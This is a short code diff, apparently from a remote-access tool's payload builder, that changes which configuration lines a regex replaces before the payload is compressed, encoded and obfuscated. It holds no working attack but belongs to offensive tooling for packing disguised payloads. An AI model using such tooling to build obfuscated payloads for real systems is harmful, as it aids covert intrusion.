@@ -46,7 +46,7 @@ def pack_py_payload(conf):
 
     with open(os.path.join(ROOT,"pp.py")) as f:
         code=f.read()
-    code=re.sub(r"DAEMONIZE=.*\nLAUNCHER=.*\nLAUNCHER_ARGS=.*", conf, code)
+    code=re.sub(r"LAUNCHER=.*\nLAUNCHER_ARGS=.*", conf, code)
     fullpayload.append(code+"\n")
 
     return compress_encode_obfs('\n'.join(fullpayload)+"\n")
